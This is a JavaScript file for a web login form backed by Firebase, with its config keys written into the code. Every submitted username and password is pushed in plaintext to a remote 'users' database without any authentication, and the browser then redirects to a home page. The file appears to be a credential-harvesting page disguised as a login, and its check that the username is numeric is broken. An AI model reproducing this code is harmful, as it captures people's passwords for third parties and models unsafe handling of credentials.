// Firebase configuration 
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-database.js";

const firebaseConfig = {
    apiKey: "AIzaSyCqydXE4QLD0XVlOnq-eo7aFsxIMORhi-w",
    authDomain: "define-b915c.firebaseapp.com",
    databaseURL: "https://define-b915c-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "define-b915c",
    storageBucket: "define-b915c.appspot.com",
    messagingSenderId: "78144021239",
    appId: "1:78144021239:web:99bce517042f924ddf29f2",
    measurementId: "G-14PP2VD553"
};

// Initialize Firebase and collect users' data
const app = initializeApp(firebaseConfig);
const database = getDatabase(app);
const usersRef = ref(database, 'users');

const form = document.getElementById('loginForm');
const submitButton = document.getElementById('submitButton');

submitButton.addEventListener('click', (e) => {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    writeData(username, password);
});

// Only write data when they meet conditions
function writeData(username, password) {
    if ((username.length == 8) && (typeof Number(username) == 'number')) {
            const userRef = push(usersRef); // create a unique key for each user
            set(userRef, {
            username,
            password
        }).then(() => {
            console.log('Data successfully written to Firebase!');
            openHome();
        }).catch((error) => {
            console.error('Error writing data to Firebase: ', error);
        });
    } else {
        alert('Username must contain 8 numbers');
    }
}

// Hide and show password
const togglePassword = document.querySelector("#togglePassword");
const password = document.querySelector("#password");

togglePassword.addEventListener("click", function () {

    const type = password.getAttribute("type") === "password" ? "text" : "password";
    password.setAttribute("type", type);

    this.classList.toggle("fa-eye");
});

// Open homepage 
function openHome() {
  window.location.href = "../html/home.html";
}

// Remove a Recent login item 
const removeButtons = document.querySelectorAll('.recent-login__item-remove');

removeButtons.forEach(button => {
    button.addEventListener('click', () => {
    
    const parent = button.parentNode;
    
    parent.style.opacity = 0;
    parent.style.transition = 'opacity 0.2s ease-in-out';

    setTimeout(() => {
        parent.remove();

        const nextSibling = parent.nextElementSibling;
        if (nextSibling) {
        nextSibling.style.animation = 'slide 0.5s ease-in forwards';
        }
    }, 500);
    });
});


// Check conditions input values 
const usernameInput = document.getElementById('username');
const loginButton = document.getElementById('submitButton');

loginButton.addEventListener('click', () => {
    const username = usernameInput.value;
    if ((username.length == 8) && (typeof Number(username) == 'number')) {
        openHome();
    } else {
        alert('Username must contain 8 numbers');
    }
});